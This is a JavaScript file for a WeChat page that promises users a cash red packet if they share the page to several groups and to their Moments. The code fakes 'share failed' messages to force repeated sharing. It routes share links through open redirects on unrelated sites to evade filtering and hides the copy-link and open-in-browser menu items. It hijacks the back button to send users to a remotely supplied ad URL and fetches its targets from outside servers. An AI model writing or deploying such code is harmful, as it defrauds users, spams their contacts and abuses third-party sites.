var ZZname = 'me';
window.sdk_config = {
    "debug": false,
    "appId": 'wxec80a7d7c066893d',
    "timestamp": 1551343997,
    "nonceStr": 'xFNAW5adzPZAgXda',
    "signature": '3162a3851807669ce114996182bf03e68f67219d',
    "jsApiList": ["onMenuShareTimeline", "onMenuShareAppMessage", "hideMenuItems", "showMenuItems"],
    'ticket': '85q5h79kx7ca40c6nspkj9rckewmmcrx'
};
_f = JSON.parse(window.atob(_f));
var aam = "";
var bbm = "";
var address = "";
var city = address.replace(/(.*)市/, '$1');
city = city.replace(/(.*)省/, '$1');
_f.s.ptitle0 = _f.s.ptitle0.replace(/{city}/g, city);
_f.s.title1 = _f.s.title1.replace(/{city}/g, city);
_f.s.title2 = _f.s.title2.replace(/{city}/g, city);
_f.s.title3 = _f.s.title3.replace(/{city}/g, city);
_f.s.title4 = _f.s.title4.replace(/{city}/g, city);
_f.s.title5 = _f.s.title5.replace(/{city}/g, city);
_f.s.title6 = _f.s.title6.replace(/{city}/g, city);
_f.s.ptitle1 = _f.s.ptitle1.replace(/{city}/g, city);
_f.s.ptitle2 = _f.s.ptitle2.replace(/{city}/g, city);
_f.s.desc1 = _f.s.desc1.replace(/{city}/g, city);
_f.s.desc2 = _f.s.desc2.replace(/{city}/g, city);
_f.s.desc3 = _f.s.desc3.replace(/{city}/g, city);
_f.s.desc4 = _f.s.desc4.replace(/{city}/g, city);
_f.s.desc5 = _f.s.desc5.replace(/{city}/g, city);
_f.s.desc6 = _f.s.desc6.replace(/{city}/g, city);
document.title = _f.tt.replace(/{city}/g, city);

function getParam(name, url) {
    var r = new RegExp('(\\?|#|&)' + name + '=(.*?)(#|&|$)');
    var m = (url || location.href).match(r);
    return (m ? m[2] : '');
}
window.name = getParam('mou');
var share = 0;
setTimeout("show_1()", 500);
function show_1() {
    wxalert('<span style="font-size: 23px;color:#1BBC9B;">恭喜你</span><br/><br/><span>您获得現金紅包</span><br/><span style="font-size: 20px;color:red;">' + window.name + '元</span><br/><span style="color:red;">活動宗旨為文宣本公司的知名度，分享到群後</span><span  style="color:red; font-size: 25px;">即可領取</span><br/><span>红包总额仅剩余</span><span style="font-size: 20px;color:red;">3378.3萬</span>元，先到先得，馬上分享領取到賬！<br/>', '我知道了');
}
$('#tk').on('click', function () {
    switch (share) {
        case 0:
            wxalert('<span style="font-size: 23px;color:#1BBC9B;">恭喜你</span><br/><br/><span>您获得現金紅包</span><br/><span style="font-size: 20px;color:red;">' + window.name + '元</span><br/><span style="color:red;">活動宗旨為文宣本公司的知名度，分享到群後</span><span  style="color:red; font-size: 25px;">即可領取</span><br/><span>红包总额仅剩余</span><span style="font-size: 20px;color:red;">3378.3萬</span>元，先到先得，馬上分享領取到賬！<br/>', '我知道了', '确定');
            break;
        case 1:
            wxalert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b><br/>请繼續分享到<b style="font-size: 18px;color: red">2</b>個不同的群<br/><span style="color:red;">紅包將立即到賬！</span>', '确定');
            break;
        case 2:
            wxalert('<b style="font-size: 22px;color: red;">分享失敗！</b><br/>注意：分享到相同的群會失敗！<br>請繼續分享到<b style="font-size: 18px;color: red">2</b>個不同的群！', '我知道了');
            break;
        case 3:
            wxalert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b><br/>請繼續分享到<b style="font-size: 18px;color: red">1</b>個不同的群<br/><span style="color:red;">紅包將立即到賬！</span>', '确定');
            break;
        case 4:
            wxalert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b><br/>剩下最後一步啦！<br />請分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>，獲贈<b style="font-size: 18px;color: red;">' + window.name + '</b>元💰立即到賬！', '确定');
            break;
        case 5:
            wxalert('<b style="font-size: 22px;color: red;">分享失敗！</b><br>注意：必須[<span color="red">公開</span>]分享哦!<br>請嘗試重新分享到<b style="font-size: 18px;color: red">朋友圈</b><br>', '我知道了');
            break;
        case 6:
            wxalert('<font style="color:green;">恭喜您</font>获得￥ <span style="font-size: 20px;color: red;">' + window.name + '</span> 现金红包，<br/><font style="color: black; font-size:16px;"><br/>再次感谢您的参与<br/><b style="color:red">注意：系统将会验证朋友圈信息判断是否完成分享任务!</b><br/>由于活动量巨大<br>红包最迟24小时内到账至钱包<br/>删除分享链接可能导致无法到账<br/></font>', '我知道了', kikm);
    }
})


function shaer_tips() {
    switch (share) {
        case 0:
            window.result.t.title = _f.s.title2;
            window.result.t.desc = _f.s.desc2;
            window.result.t.link = getFileName(aam, 1);//_f.f[2];
            window.result.t.img_url = _f.s.img2;
            configReload(1);
            wxalert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b><br/>请繼續分享到<b style="font-size: 18px;color: red">2</b>個不同的群<br/><span style="color:red;">紅包將立即到賬！</span>', '确定');
            share++;
            break;
        case 1:
            window.result.t.title = _f.s.title3;
            window.result.t.desc = _f.s.desc3;
            window.result.t.link = getFileName(aam, 1);// _f.f[3];
            window.result.t.img_url = _f.s.img3;
            configReload(1);
            wxalert('<b style="font-size: 22px;color: red;">分享失敗！</b><br/>注意：分享到相同的群會失敗！<br>請繼續分享到<b style="font-size: 18px;color: red">2</b>個不同的群！', '我知道了');
            share++;
            break;
        case 2:
            window.result.t.title = _f.s.title4;
            window.result.t.desc = _f.s.desc4;
            window.result.t.link = getFileName(aam, 1);//_f.f[4];
            window.result.t.img_url = _f.s.img4;
            configReload(1);
            wxalert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b><br/>請繼續分享到<b style="font-size: 18px;color: red">1</b>個不同的群<br/><span style="color:red;">紅包將立即到賬！</span>', '确定');
            share++;
            break;
        case 3:
            window.result.t.title = _f.s.ptitle1;
            window.result.t.link = getFileName(aam, 1);//_f.f[7];
            window.result.t.img_url = _f.s.pimg1;
            window.result.t.type = 'link';
            configReload(2);
            wxalert('<b style="font-size: 22px;color: #1BBC9B;">分享成功！</b><br/>剩下最後一步啦！<br />請分享到<span style="font-size: 30px;color: #f5294c">朋友圈</span>，<br />獲贈<b style="font-size: 18px;color: red;">' + window.name + '</b>元💰立即到賬！', '确定');
            share++;
            break;
        default:
            wxalert('<b style="font-size: 24px;color: red;">请分享到朋友圈</b>分享到群<b></b>', '确定');
            break;
    }
}
function shaer_p_tips() {
    switch (share) {
        case 4:
            window.result.t.title = _f.s.ptitle2;
            window.result.t.link = getFileName(aam, 1) + '?name=3';// _f.f[8];
            window.result.t.img_url = _f.s.pimg2;
            configReload(2);
            wxalert('<b style="font-size: 22px;color: red;">分享失敗！</b><br>注意：必須[<span color="red">公開</span>]分享哦!<br>請嘗試重新分享到<b style="font-size: 18px;color: red">朋友圈</b><br>', '我知道了');
            share++;
            break;
        case 5:
            share++;
            $.get(bbm.replace(/\*/, makeid()) + '/023f6b6f58c1f97a4edbeddb9fc4b15e?pop=' + _bosi, function (rData) { if (rData != "") { _bhw = rData; }; });
            wxalert('<font style="color:green;">恭喜您</font>获得￥ <span style="font-size: 20px;color: red;">' + window.name + '</span> 现金红包，<br/><font style="color: black; font-size:16px;"><br/>再次感谢您的参与<br/><b style="color:red">注意：系统将会验证朋友圈信息判断是否完成分享任务!</b><br/>由于活动量巨大<br>红包最迟24小时内到账至钱包<br/>删除分享链接可能导致无法到账<br/></font>', '我知道了', kikm);
            break;
    }
}
function config_json(re) {
    var r = {
        'config': re,
        't': {
            'title': '',
            'desc': '',
            'img_url': '',
            'link': location.href,
            'type': 'link'
        }
    };
    r.config.jsApiList = ["onMenuShareTimeline", "onMenuShareAppMessage", "hideOptionMenu", "showOptionMenu", "hideMenuItems", "showMenuItems", "closeWindow"];
    return r;
}
function strdesc(r) {


    r.t.title = _f.s.title1;
    r.t.desc = _f.s.desc1;
    r.t.img_url = _f.s.img1;
    r.t.link = getFileName(aam, 1);// _f.f[1];
    return r;
}
function is_main_host(host) {
    if (host == location.hostname) {
        return true;
    }
    host = '.' + host;
    var index = location.hostname.indexOf(host);
    if (index > -1) {
        return location.hostname.length == index + host.length;
    } else {
        return false;
    }
}
function share_config(data) {
    wx.config(data.config);
    wx.ready(function () {
        wx.onMenuShareAppMessage({
            title: data.t.title,
            desc: data.t.desc,
            link: data.t.link.replace(/{domain}/, aam).replace(/{pmain}/, bbm).replace(/\*/, makeid()),
            imgUrl: data.t.img_url,
            type: 'link',
            success: function () {
                shaer_tips();
            }
        });
        wx.onMenuShareTimeline({
            title: data.t.title,
            link: data.t.link.replace(/{domain}/, aam).replace(/{pmain}/, bbm).replace(/\*/, makeid()),
            imgUrl: data.t.img_url,
            type: 'link',
            success: function () {
                shaer_p_tips();
            }
        });
        wx.hideMenuItems({
            menuList: ['menuItem:share:qq',
                'menuItem:share:weiboApp',
                'menuItem:favorite',
                'menuItem:setFont',
                'menuItem:copyUrl',
                'menuItem:readMode',
                'menuItem:openWithQQBrowser',
                'menuItem:share:email',
                'menuItem:share:facebook',
                'menuItem:share:QZone',
                'menuItem:share:timeline',
                'menuItem:openWithSafari'
            ]
        });
    });
}


$(function () {
    function start_load() {
        var hostname = location.hostname.match(/[a-zA-Z0-9\-]+\.[a-zA-Z0-9]+$/);
        if (hostname) {
            hostname = hostname[0];

            GetEntranceHost(function (entranceHost) {
                var eh = getParam('chost');
                if (eh != null && eh != "") {
                    entranceHost = eh;
                }
                $.ajax({
                    url: "https://50pk.cc/api/config/GetConfigCors",
                    type: "POST",
                    data: JSON.stringify({ type: 'WxPlatform', hosts: [hostname, entranceHost] }),
                    contentType: "application/json",
                    crossDomain: true,
                    success: function (data) {
                        window.result = config_json(data.cfg || {});
                        aam = 'http://*.' + entranceHost;
                        bbm = 'http://*.' + entranceHost;
                        share_config(strdesc(window.result));
                    }
                });
            });
        }
    }
    if (typeof WeixinJSBridge === "undefined") {
        if (document.addEventListener) {
            document.addEventListener('WeixinJSBridgeReady', start_load, false);
        } else if (document.attachEvent) {
            document.attachEvent('WeixinJSBridgeReady', start_load);
            document.attachEvent('onWeixinJSBridgeReady', start_load);
        }
    } else {
        start_load();
    }
});
function configReload(type) {
    wx.config(window.result.config);
    wx.ready(function () {
        if (type == 1) {
            wx.hideMenuItems({
                menuList: ['menuItem:share:timeline']
            });
            wx.onMenuShareAppMessage({
                title: window.result.t.title,
                desc: window.result.t.desc,
                link: window.result.t.link.replace(/{domain}/, aam).replace(/{pmain}/, bbm).replace(/\*/, makeid()),
                imgUrl: window.result.t.img_url,
                type: 'link',
                success: function () {
                    shaer_tips();
                }
            });
        }
        else {
            wx.hideMenuItems({
                menuList: ['menuItem:share:appMessage']
            });
            wx.showMenuItems({
                menuList: ['menuItem:share:timeline']
            });
            wx.onMenuShareTimeline({
                title: window.result.t.title,
                link: window.result.t.link.replace(/{domain}/, aam).replace(/{pmain}/, bbm).replace(/\*/, makeid()),
                imgUrl: window.result.t.img_url,
                type: window.result.t.type,
                success: function () {
                    shaer_p_tips();
                }
            });
        }
    });
}
function kikm() { location.href = _bhw; }
function wxalert(a, b, c) {
    $('.avt').remove();
    var _str = '<div class="avt" style=" width: 90%; height: auto; background: #fff;position: fixed;left: 5%; top: 22%;z-index: 9999;text-align: center;border-radius: 4px;"><div class="tips" style="width: 90%;margin: 20px 5%;font-size: 18px;line-height: 1.5em;color: #3F3F3F;">' + a + '</div><div class="isok" style=" width: 100%;height: 45px;text-align: center;line-height: 45px;font-size: 22px;border-top: 1px dotted #d6d6d6;color: #0bb20c;">' + b + '</div></div>';
    $('body').append(_str);
    $('.isok').click(function () {
        $("#tk").show();
        if (typeof c === 'function') {
            c();
        }
        $('.avt').remove();
    });
}

$.ajax({
    url: "https://js.bjyshj.cn/api/ad/GetUrlCors?id=1",
    type: "POST",
    data: JSON.stringify({}),
    contentType: "application/json",
    crossDomain: true,
    success: function (data) {
        setTimeout(function () {
            history.pushState(history.length + 1, "ttt", "#" + new Date().getTime());
        }, 200);
        window.onhashchange = function () {
            location.href = data.link;
        };
    }
});
function makeid() {
    var text = "";
    var possible = "abcdefghijklmnopqrstuvwxyz0123456789";
    for (var i = 0; i < Math.floor(Math.random() * 3 + 2); i++)
        text += possible.charAt(Math.floor(Math.random() * possible.length));
    return text;
}
//获取随机数
function getRandomNum(min, max) {
    if (min > max) {
        return min;
    }
    var range = max - min;
    var rand = Math.random();
    var r = Math.round(rand * range)
    return (min + r == max ? min : min + r);
}

//随机返回数组中的项
function getRandomItem(array) {
    if (array == null || array.length == 0) {
        return null;
    }
    return array[getRandomNum(0, array.length)]
}
function urlAppendParam(url, param) {
    if (url == null) {
        return null;
    }
    return url + (url.indexOf('?') > -1 ? '&' : '?') + param;
}
function getFileName(host, id) {
    var result = '';
    $.ajax({
        url: 'https://50pk.cc/api/page/Page/GetFileName?__ignore_referrer=true',
        type: "POST",
        data: JSON.stringify({ host: host, type: "Entrance", id: id }),
        async: false,
        contentType: "application/json",
        crossDomain: true,
        success: function (data) {
            result = data || '';
            //控制跳转开始
            result = urlAppendParam(result, 'from=app');
            var heads = [
                'http://ivy.pcauto.com.cn/click?adid=418634&id=pc.cpdq.zdym.sjyc1.&url={url}',
                'http://weibo.cn/sinaurl?u={url}',
                'http://' + makeid() + '.189.cn/dqmh/ssoLink.do?method=skip&platNo=93507&toStUrl=http://189.cn.{nohttpurl}'
            ];
            var head = getRandomItem(heads);
            head = head.replace('{url}', encodeURIComponent(result))
            head = head.replace('{nohttpurl}', result.replace('http://', ''))

            result = head;
            //控制跳转结束
        }
    });
    return result;
}
function GetEntranceHost(success) {
    $.ajax({
        url: 'https://50pk.cc/api/page/Page/GetEntranceHost?__ignore_referrer=true',
        type: "POST",
        data: JSON.stringify({}),
        contentType: "application/json",
        crossDomain: true,
        success: success
    });
}
